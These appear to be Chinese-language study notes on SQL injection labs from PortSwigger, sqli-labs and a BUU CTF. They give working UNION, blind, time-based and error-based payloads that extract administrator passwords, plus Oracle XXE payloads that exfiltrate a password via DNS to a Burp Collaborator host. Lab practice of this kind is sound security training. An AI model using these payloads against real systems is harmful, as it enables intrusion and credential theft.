#SQL注入#
##一、portswigger训练场##
###有用的sql injection cheet sheet 
https://portswigger.net/web-security/sql-injection/cheat-sheet

###第一题：显示所有商品###
用get方式传输数据。
题目提示：后台执行sql语句为：SELECT * FROM products WHERE category = 'Gifts' AND released = 1

将输入Gifts改为：' or 1=1--   即可完成。
实际上后台执行语句为：SELECT * FROM products WHERE category = '' or 1=1--


###第二题：login绕过###
网站login需要输入用户名和密码
####要求：用administrator登录####

尝试：题目用post方式传输，在用户名框输入',发现语句可以执行，报错，猜测有sql注入漏洞；
进一步猜测执行语句为

    SELECT firstname FROM USERS Where username='aaaa' and password = 'aaaa'

在用户名框输入administrator'--   即可绕过password的判断，完成administrator登录

###第三题：判断column数目###
背景知识：
假设有两个table    
  tab1 ****    tab2                  
  a|b  ******   c|d

  1,2  ******2,3
  3,4  ******4,5

即每个table都有两个column。

尝试两个查询语句：

    Quary#1：select a,b from tab1  
    结果为1，2 ；2，3
    Quary#2：select a,b from tab1 union select c,d from tab2  
    结果为1，2 ；2，3； 2，3；4，5
    
union查询语句的规则：


    1.前后两个查询语句的column数目和顺序一样
    2.两个查询的数据类型是可兼容的

要确定column数目，有两种攻击方式：

    攻击1.select ? from tab1 union select NULL,NULL,NULL....
通过不断增加NULL，当查询结果不返回error时候，则column数目正确
    攻击2.select ? from tab2 order by n
order by n是按照第n列进行排序，n=1即按照第一列排序，若tab1有3列，则n<=3都会返回正确结果；n>=4,都会报错。

###第四题：确定哪个column的数据类型是string###
基于上述的union select语句

    select ? from tab1 union select NULL,NULL,NULL....

将其中的某个null改为'aaa'，表明是string类型,挨个替换null去试，哪个不报错，说明union前后两个column的类型一致，说明那个column的数据类型是string
如：

    select ? from tab1 union select NULL,'aaa',NULL....
说明2nd column为string类型

###第五题：找到administrator的密码###
已知有个table的名字是user,包含username和password两个column，有个用户名是administrator，利用union select语句输入密码

目前，有漏洞的地方查询的tabel刚好有2个column，table user也是2个column，故直接输入:

    pets' union select username,password from users where username='administrator'--

相当于后台执行语句：
   `select a,b from tab1 where id= 'pets' union select username,password from users where username='administrator'--`

###lab6：显示出user列表中所有信息###
已知有个table名字叫user，包含username,password两个column，用union查询语句显示列表中所有信息

1.用order by确定只有两个column，再判断哪个column能够显示text
    
    'union select 'a',null--
    'union select null,'a'--
	'union select '1',null--
发现第一个查询报错，第二个正确，第三个正确，说明只有第二个column能够显示text，第一个column应该显示的是数字，类似于id。

2.可以采用以下语句，分别输入username和password

     'union select null,username from users--
     'union select null,password from users--
将两次得到的结果结合，即可获得username和对应的password

3.也可以尝试用将username和password字符串拼接，一起输出
	

- 3.1 不同的数据库有不同的拼接方法，先用sql注入cheet sheet中确定数据库方法，挨个试试，确定数据库类型，采用：
     `'union select null,@@version--`  结果报错
	`'union select null,version()  结果显示正确`

确定是PostgreSQL数据库

- 3.2 用PostgreSQL数据库字符串拼接的方法：
     `PostgreSQL	'foo'||'bar'`

也就是说：
	`'union select null, username||'~'||password from users--`
中间的~是为了区分开username和password
- 另外，发现用mysql的concat语句也可以实现：
	`'union select null, concat(username,'~',password) from users--`
原因是：PostgreSQL中也实现了concat函数

###lab7：找到Oracle数据库的版本号###
已知用了oracle数据库，用union语句找到版本号
1.order by知道了有两个column，但是用：
  `  'union select null,'a'--   结果报错`

根据之前网页的返回结果，明明数据类型就是string，不应该错，但还是返回错误。这时候，google一下oracle select statements，发现select语句中一定要有from tablename的字段，这是发现oracle提供一个属于schema的**dual table**供用户使用，因此，语句改为：

    ?category=Gifts' union select null,'aa' from DUAL--  结果显示正确

进一步，用cheet sheet中的oracle查询版本语句得到版本号：
  ` ?category=Gifts' union select null,banner from v$version--`

###lab8：得到mysql的版本号####

和lab7类似，只不过mysql的注释使用--发现不行，于是在cheet sheet中发现也可以用#，故：
 ` ?category=Gifts' union select null,@@version#`

也可以使用--+，故：
 ` ?category=Gifts' union select null,@@version--+`

###lab9获取table名字以及用户信息###
已知数据库不是oracle，存在一个包含username和password的table，要求采用union获取table名字以及用户信息
1.order by 确定有两个column
2.union select 'a','a'-- 确定两个column都是string类型
3.version确定数据库版本为postgreSQL数据库
4.
根据cheet sheet中postgreSQL语法，

> SELECT * FROM information_schema.tables

构造查询语句
`?category=Pets%27union%20select%20null,table_name%20from%20information_schema.tables--`

注意不能直接硬套语句，根据union规则，前后两个查询语句查的column数目要一样，order by确定了前面的查询语句所查的column数目为2，故采用null,table_name。可以google information schema postgreSQL查看tables有哪些column的名字。

根据以上返回结果，得到了users_szggts的表名字

采用以下语句查找该表的column名字
    'union select null,column_name from information_schema.columns where table_name='users_szggts'--

发现了username和password两个名字，继续输入用户信息，


    'union select username_rztjmt,password_jmrdrk from users_szggts--


###lab10:获取oracle数据库的内容###
已知数据库为oracle，和lab9一样，得到表名和内容，最终得到管理员密码


    ?category=Pets' union select null,banner FROM v$version--   确定oracle数据库版本
    ?category=Pets' union select null,table_name FROM all_tables--  得到table名字USERS_JTBOYM
    ?category=Pets' union SELECT null, column_name FROM all_tab_columns WHERE table_name = 'USERS_JTBOYM'-- 得到column名字PASSWORD_IGEQEZ和USERNAME_CNLIJJ
    ?category=Pets' union SELECT USERNAME_CNLIJJ, PASSWORD_IGEQEZ FROM USERS_JTBOYM--  得到用户名和密码
    ?category=Pets' union SELECT null, USERNAME_CNLIJJ||'!'||PASSWORD_IGEQEZ FROM USERS_JTBOYM-- 也可以改变输出形式，将用户名和密码拼接输出


###lab11：采用盲注获取用户名密码###
已知cookieid的参数存在sql注入漏洞，且存在一个user的表，进行利用得到用户名密码

1.确认cookieid存在注入漏洞，通过burp抓包得到cookie，

    Cookie: TrackingId=US5GTgznltoHpTB6; session=MbXCyIaEJsFcvDNmseBZV5oKREPuFSDq

猜测后台sql语句为select track-id from tracking-table where trackingId='xyz',采用以下payload语句：

    trackingId='xyz' and 1=1--  显示正确,这时候后台执行select track-id from tracking-table where trackingId='xyz' and 1=1--'

再执行payload语句

    trackingId='xyz' and 1=2--  显示错误
证明存在trackingId的盲注

2.确认存在user的表

    TrackingId=US5GTgznltoHpTB6' and (select 'a' from users limit 1)='a'--  显示正确，说明存在user的表

这里要注意：limit 1

3.确认user表中有administrator

    TrackingId=US5GTgznltoHpTB6' and (select username from users where username='administrator')='administrator'--  显示正确，说明users中存在administrator

4.确定password长度

    TrackingId=US5GTgznltoHpTB6' and (select 'a' from users where username='administrator' and length(password)>3)='a'--
    
不断迭代改变password长度，确认长度值为20，这里用burp的intruder实现最好

5.确定password的内容

`TrackingId=US5GTgznltoHpTB6' and (select 'a' from users where username='administrator' and substring(password,1,1)='c')='a'--`

改变substring的参数1和'c'，能够挨个确定password的内容，用burp的cluster bomb方式采用intruder实现

###lab14：时间盲注，爆破administrator的密码###
已知有盲注，有users表和administrator用户

1.确定存在注入点
    TrackingId=AnmPvsCj9wV8q2c4'%3B SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE NULL END--  结果延迟10s显示
注意，用burp发送trackingId的时候，这里要用%3B，而不能用;   原因是；在url解码的时候可能识别成其他的了。教程里面一直也都是把所有语句转换成url编码后再发送的。

2.确定有users表
    TrackingId=AnmPvsCj9wV8q2c4'%3B SELECT CASE WHEN (select 'a' from users limit 1)='a' THEN pg_sleep(10) ELSE NULL END--

3.确定有用户administrator

    TrackingId=AnmPvsCj9wV8q2c4'%3B SELECT CASE WHEN (select username from users where username='administrator')='administrator' THEN pg_sleep(10) ELSE NULL END--

4.确定password的长度，burp迭代执行语句

    TrackingId=AnmPvsCj9wV8q2c4'%3B SELECT CASE WHEN (select username from users where username='administrator' and length(password)>30)='administrator' THEN pg_sleep(10) ELSE NULL END--

5.burp迭代爆破password
    TrackingId=AnmPvsCj9wV8q2c4'%3B SELECT CASE WHEN (select username from users where username='administrator' and SUBSTRING(password,1,1)='a')='administrator' THEN pg_sleep(10) ELSE NULL END--

###lab15用SQL注入实现DNS查询###
实现out-of-band查询，通过SQL语句注入，实现DNS查询
参考SQL sheet中oracle语句，
1.打开burp collaborator client，copy下唯一的collaborator编号域名
2.复制oracle中DNS查询语句，将编号域名填入
3.将完成的payload插入到trackingId后实现sql注入，即payload 前缀加上' union，后缀加上--，即可，如下：

    TrackingId=BJ99jOxzTuHmylNK'+union+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//3pt6n9w8xjd063qmlbbf0c2n7ed91y.burpcollaborator.net">+%25remote%3b]>'),'/l')+FROM+dual--

4.发送后即可在collaborator client看到查询结果

###lab16带数据泄露的DNS查询###
利用out-of-band查询，采用SQL注入，泄露administrator密码
1.打开burp collaborator client，copy下唯一的collaborator编号域名
2.参考SQL sheet，知道oracle的泄露数据的DNS查询语句如下：

    SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

3.将collaborator编号域名填入，在"(SELECT YOUR-QUERY-HERE)"处填入要查询的语句，最终编辑的payload如下：

    TrackingId=QuzbePsRhIzhHgED'+union+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.e8nzurj4a5exb5oaa9ajpyy3eukk89.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

4.在collaborator client中得到响应数据，查看HTTP请求中的request-to-collaborator部分，注意不是response，获取的password在"e8nzurj4a5exb5oaa9ajpyy3eukk89.burpcollaborator.net"之前显示。
##二、sqli-labs-master##

###Less-3###
输入id=1'

    反馈You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

对照源码：

    $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
    $result=mysql_query($sql);
    
接着依次获取信息：

    ?id=1') order by 3 --+ 相应正确，确定只有3个column
    ?id=1') union select 'a','a','a' --+ 响应正确，确定数据类型为字符串
    ?id=-1') union select 'a',@@version,'a' --+ 这里id改为-1，是由于界面只输入一行数据，所有把id定为-1，该查询显示无数据。该查询结果为5.7.26，猜测为mysql
    ?id=-1') union select null, version(),database() --+ 得到名为security的数据库
    ?id=-1') union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 查看所有数据库，进一步确认security的数据库
	?id=-1') union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+ 查看security中所有table_name,确定users的table
	?id=-1') union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='user')--+ ,确定username和password
	?id=-1') union select 1,2,(select group_concat(username,'~',password) from users)--+，得到所有用户名和密码。
    也可以采用?id=-1') union select 1,group_concat(username,'~',password),3 from users--+ 得到所有用户名和密码

###lab4###
输入id=1'  没报错
输入id=1"  

    报错反馈     You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1 

猜测源码：

    select * from users where ID= ("id")
对照源码：

    $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
    $result=mysql_query($sql);

后续参照lab3，输入id=1") order by 3 --+

之后语句都一样。

###lab5###
输入id=1'，

    报错反馈You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

猜测源码：
    
    select * from users where ID='id',limit 0,1

对照源码：

    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);

查询结果不显示，若sql语句正确，反馈'you are in'，故可以用显错注入，输入：
id=1' and 1=1--+  有反馈
id=1' and 1=2--+  无反馈
id=1' and (select database())=''--+  无反馈
依次类推

###lab6###
输入id=1',无反馈

输入id=1",
`显示You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1`

说明只要输入"，即刻完成语句包围，后续和lab5类似。

猜测源码：
    
    select * from users where ID='id',limit 0,1
对照源码：
    
    $id = '"'.$id.'"';
    $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
    $result=mysql_query($sql);


###lab8考验布尔盲注###
检测漏洞：输入id=1' 有不同的显示，
输入id=1' --+,显示正常，说明有漏洞，但是没有反馈报错信息，也不反馈查询信息

对照源码：
    
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row){
      echo 'You are in...........';
    }else{
    }
说明sql语句正确，反馈you are in。。。；语句不正确，不反馈信息。这种情况下，采用布尔盲注。

    ?id=1' order by 3--+ 确定选择了3个column
    ?id=1' and length(database())=8--+ 确定database()含8个字符
    ?id=1' and (substr((select database()) ,2,1)) = 'a' --+ 爆破出security的数据库
    ?id=1' and ((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 'a'--+ 爆破出table的名字；通过limit 0，1该为limit n，1，逐渐增加n，依次爆破出各个table的名字。

###lab9考验时间盲注###
输入'虽然能触发漏洞，但是显示看不出来

源码：

    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    
    	if($row)
    	{
      	echo 'You are in...........';
      	}
    	else 
    	{
    	echo 'You are in...........';

不管输入什么，都输出you are in...., 也就是说无法发现是否有漏洞。

检测漏洞：

	?id=1' and sleep(10)--+  发现触发了漏洞

利用漏洞：
	?id=1' and length(database())=8 and if(1=1,sleep(10),null)--+ 爆破database

###lab10考验时间盲注###
和lab9类似，触发漏洞的符号由'变为"

###lab11###
界面要求输入用户名和密码
输入uname=1'&passwd=2'&submit=Submit  报错如下：

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2' ' LIMIT 0,1' at line 1

发现注入漏洞，属于符号型

猜测源码：

    select * from users where username='uname' and password='passwd'

对照源码：

    @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
    	$result=mysql_query($sql);
    	$row = mysql_fetch_array($result);

payload：
    uname=1' or 1=1 #&passwd=2 &submit=Submit 
这里只能用#，用--+不行，未知原因

###lab12###
和lab11类似，触发漏洞由'变为")

###lab13###
和lab12类似，触发漏洞变为')

###lab14###
和lab12类似，触发漏洞变为"

###lab15和lab16###
分别为单引号闭合的布尔盲注和")闭合的布尔盲注，猜解即可。

    uname=1' or length(database())=8 or 1=2#&passwd= 1'&submit=Submit

###lab17###
界面为password reset，考察update的注入
要求输入username和password

模板为：UPDATE table SET id = id + 1;

猜测源码：

    "UPDATE users SET password = '$passwd' WHERE username='uname'";

对照源码：

	@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
    if($row)
    	{
    		$row1 = $row['username'];  	
    		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
    		mysql_query($update);
      		echo "<br>";
发现uname位置不存在注入，password处可以注入。

payload：

    uname=admin&passwd=1' or updatexml(1,concat(0x7e,(version()),0x7e),0) or '&submit=Submit

需要提前知晓用户名，如admin，然后用两个or断开，成功修改admin的密码。若不存在admin，则会失败报错



##三、BUU##

###2019随便注###
存在字符select，update, delete,where,insert字符串的过滤
发现show没有过滤
1.show databases 回显数据库
2.show tables 会显表，发现有wors 和 1911191919119两个表
3.show columns from \`1911191919119`, 注意这里用符号\`,表明是表名、列名、数据库名等，不用则失败；words表可以不加该符号，能够识别。发现了存在flag的column

直接输入payload：

    1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#

其中concat(char(115,101,108,101,99,116)等同于select，绕过过滤



##检测漏洞方法##

	?id=1' --+  符号型漏洞
	?id=1' and sleep(10)--+  时间注入型
	?id=1' and 1=2 --+ 布尔型
	?id=1' and --+
	提交OASTpayloads触发out-of-band网络交互，如DNS